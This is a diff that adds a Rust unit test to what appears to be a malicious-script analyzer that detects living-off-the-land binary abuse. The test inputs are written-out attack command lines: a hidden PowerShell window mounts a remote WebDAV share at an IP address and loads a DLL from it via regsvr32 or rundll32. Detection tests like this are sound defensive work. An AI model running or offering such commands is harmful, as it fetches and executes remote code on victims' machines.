@@ -20414,6 +20414,19 @@ mod unc_webdav_tests {
     }
 
     #[test]
+    fn unc_webdav_regsvr32_chain_emits_lolbas_trait() {
+        let script = br#"start powershell.exe -windowstyle hidden net use \\45.9.74.36@8888\davwwwroot\  regsvr32 /s \\45.9.74.36@8888\davwwwroot\163141239210479.dll"#;
+        let report = analyze(script, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Lolbas { name, cmd }
+                if name == "regsvr32" && cmd.contains(r#"\\45.9.74.36@8888\davwwwroot\163141239210479.dll"#)
+            )
+        });
+        assert!(has, "no regsvr32 LOLBAS trait: {:?}", report.traits);
+    }
+
+    #[test]
     fn unc_webdav_deduped_per_command() {
         // Same UNC server referenced twice in one line — emit only one trait per (host, port)
         let script = br#"net use \\45.9.74.36@8888\davwwwroot\ & rundll32 \\45.9.74.36@8888\davwwwroot\x.dll"#;
